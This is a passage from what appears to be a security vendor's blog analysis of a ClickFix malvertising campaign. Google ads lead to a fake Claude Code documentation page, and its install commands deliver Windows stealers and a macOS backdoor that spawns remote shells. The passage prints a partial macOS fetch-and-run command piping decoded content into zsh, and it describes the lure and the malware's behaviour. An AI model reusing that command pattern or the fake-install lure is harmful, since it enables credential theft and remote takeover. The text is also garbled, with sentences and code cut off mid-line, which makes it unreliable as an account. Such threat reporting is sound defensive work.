href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-gb\u002Fblog\u002Fbusinessinsights\u002Fhow-clickfix-cyberattack-technique-works?srsltid=AfmBOooOGUTc1_PsvutjVR__O9fBBVixrY6KwkNDuhoQPdqdrhNvDoIJ\" rel=\"noreferrer\"\u003EClickFix\u003C\u002Fa\u003E, which tricks users into running terminal commands that actually install malware on Windows or macOS systems. This campaign has also been documented by our \u003Ca href=\"https:\u002F\u002Fpushsecurity.com\u002Fblog\u002Finstallfix\u002F\" rel=\"noreferrer\"\u003Efellow researchers at PushSecurity\u003C\u002Fa\u003E.\u003C\u002Fp\u003E\u003Ch2 id=\"how-this-attack-works\"\u003EHow this attack works\u003C\u002Fh2\u003E\u003Cp\u003EFirst, attackers buy Google advertisements that appear when users search for things like “download claude code” and similar variants. The ad looks real and copies the official branding. Because Google marks it as a sponsored result, users likely assume it passed verification.\u003C\u002Fp\u003E\u003Cp\u003ESecondly, the ad redirects users to a fake documentation page hosted on a Squarespace subdomain. The page copies the real Claude Code Docs&nbsp;layout, navigation structure and styling. \u003C\u002Fp\u003E\u003Cp\u003ENothing looks suspicious or out of place. The only element &nbsp;that doesn’t immediately match is the URL, but not everyone will double-check the URL. Even if they do, they see Squarespace, which is known.\u003C\u002Fp\u003E\u003Cp\u003EThirdly, the page presents installation instructions that change depending on the visitor’s OS. For example, Windows users see a command that leverages mshta.exe, a real Microsoft utility, to download and execute a remote payload.\u003C\u002Fp\u003E\u003Cp\u003EOn the other hand, macOS users will encounter a more complex terminal command that decodes Base64-encoded content, triggering a multi-stage infection chain.\u003C\u002Fp\u003E\u003Cp\u003EFourth, once the victim runs the command, the malware retrieves a secondary payload from the attacker-controlled infrastructure. On Windows, the payload includes a stealer detected as Trojan.Stealer.GJ and Trojan.Stealer.GK.\u003C\u002Fp\u003E\u003Cp\u003EOn macOS, the downloaded Mach-O binary installs a backdoor that can spawn \u003Cem\u003E\u002Fbin\u002Fbash\u003C\u002Fem\u003E or \u003Cem\u003E\u002Fbin\u002Fzsh\u003C\u002Fem\u003E, and enable remote command execution.\u003C\u002Fp\u003E\u003Cp\u003EWhat makes this dangerous is that the attackers never exploit a software flaw. The entire infection relies on the victim’s willingness to follow instructions and fall for the ClickFix&nbsp;social engineering tactic.&nbsp;\u003C\u002Fp\u003E\u003Ch2 id=\"the-deceiving-claude-ad\"\u003EThe deceiving Claude ad\u003Cbr\u003E\u003C\u002Fh2\u003E\u003Cp\u003EUsers search for something that looks like this:\u003C\u002Fp\u003E\u003Cfigure 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe page closely mirrored the real documentation hosted at:\u003C\u002Fp\u003E\u003Cp\u003E\u003Ca id=\"from-documentation-to-malware-execution\"\u003EFrom documentation to malware execution\u003C\u002Fh2\u003E\u003Cp\u003EThe fake page instructed people to install Claude Code using terminal Anyone accustomed to developer tools could be tricked into copying and executing them without hesitation.\u003C\u002Fp\u003E\u003Cp\u003EThat moment triggered the infection recursively decrypt a memory-embedded Microsoft Intermediate Language (MSIL) payload that results in a shellcode at the latest stage.\u003C\u002Fp\u003E\u003Cp\u003EThe MSIL stagers run by the HTA are detected as another couple of Trojans:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003EIL:Trojan.MSILZilla.245316\u003C\u002Fli\u003E\n\u003Cli\u003EGen:Variant.Barys.509034\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"what-happens-to-macos-users\"\u003EWhat happens to macOS users\u003C\u002Fh2\u003E\u003Cp\u003EmacOS users see a different command that’s more complex and intentionally http:\u002F\u002Fcode.claude[.]ai\u002Fdownload\u002F\" &amp;&amp; curl -sSfL $(echo ' &lt;BASE_64_PAYLOAD&gt; '|base64 -D)| zsh\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThis command PAYLOAD_END\n)\neval \"$tnyrzi\"\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe script decodes and decompresses embedded content, then executes it.\u003C\u002Fp\u003E\u003Cp\u003EThe rights, and launches the binary.\u003C\u002Fp\u003E\u003Cp\u003ENo installer appears, and there’s no prompt to warn the user. The malware executes silently.\u003C\u002Fp\u003E\u003Cp\u003EThe macOS malware executes Anti-Sandbox\u002Fanti-VM checks similar to those of the AMOS stealer, a known macOS infostealer capable of harvesting credentials, browser data, and crypto-related information.\u003C\u002Fp\u003E\u003Ch2 id=\"inside-the-macos-backdoor\"\u003EInside the macOS Backdoor\u003C\u002Fh2\u003E\u003Cp\u003EAnalysis of the universal Mach-O binary shows that it acts like a backdoor or reverse shell.\u003C\u002Fp\u003E\u003Cp\u003EThe binary:\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003EIt uses a global constructor (mod_init_func) so that its malicious code runs automatically as soon as the binary is loaded.\u003C\u002Fli\u003E\n\u003Cli\u003EThe binary hides its main purpose through heavy string obfuscation.\u003C\u002Fli\u003E\n\u003Cli\u003EIt relies on decryption routines (such as sub_10005d330 and sub_100053970) to hide both its payload and its true purpose.\u003C\u002Fli\u003E\n\u003Cli\u003ENotably, the functions sub_100000730 (for arm64) and sub_100000700 (for x86_64) are responsible for executing a shell. They use fork, pipe, dup2, and execl to launch \u002Fbin\u002Fbash or \u002Fbin\u002Fzsh, while redirecting input and output streams.\n\u003Cul\u003E\n\u003Cli\u003Esub_100000730 (arm64)\u003C\u002Fli\u003E\n\u003Cli\u003Esub_100000700 (x86_64)\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003EThe malware heavily relies on arithmetic-based decryption loops to conceal its true functionality.\u003C\u002Fli\u003E\n\u003Cli\u003EIt also automates launching shell sessions, making it easy for attackers to remotely control the infected machine.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EAll of these behaviors are strong signs that the malware was built to allow remote access and control by attackers.\u003Cbr\u003E\u003C\u002Fp\u003E\u003Ch2 id=\"the-advertiser-account-connection\"\u003EThe advertiser account connection\u003C\u002Fh2\u003E\u003Cp\u003EAs you would expect, Google doesn’t let anyone post any type of ad, and there’s usually scrutiny.
